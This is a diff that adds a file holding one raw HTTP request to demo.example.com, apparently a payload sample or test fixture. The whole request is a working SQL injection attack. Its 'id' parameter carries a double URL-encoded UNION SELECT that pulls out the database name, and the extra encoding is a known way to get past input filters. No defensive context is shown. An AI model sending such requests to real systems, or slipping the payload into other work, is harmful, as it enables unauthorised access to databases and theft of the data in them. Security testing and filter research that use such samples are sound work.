@@ -1,0 +1,4 @@
+GET /a?id=1%2Bunion%2Bselect%2Bconcat%25280x7e%252Cdatabase%2528%2529%252C0x7e%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
